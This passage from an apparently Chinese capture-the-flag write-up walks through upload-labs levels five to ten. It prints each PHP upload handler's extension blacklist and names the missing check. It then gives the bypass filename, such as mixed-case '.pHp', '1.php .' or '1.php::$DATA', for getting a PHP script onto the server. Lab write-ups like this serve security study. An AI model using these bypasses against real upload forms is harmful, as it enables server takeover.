        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>本题与第十题完全一样，详细解答见第十题</p>
<img src="/2021/03/03/net-a-and-d/E:%5Cmyblog%5Cszyblog%5Csource%5C_posts%5Cuploads%5C5.png" style="zoom:50%;">



<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细查看源码会发现少了下面的这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>跟第六关对比发现少了这句话</p>
<pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" style="zoom:67%;">





<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" style="zoom:67%;">

<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细观察发现少了这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" style="zoom:50%;">

<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
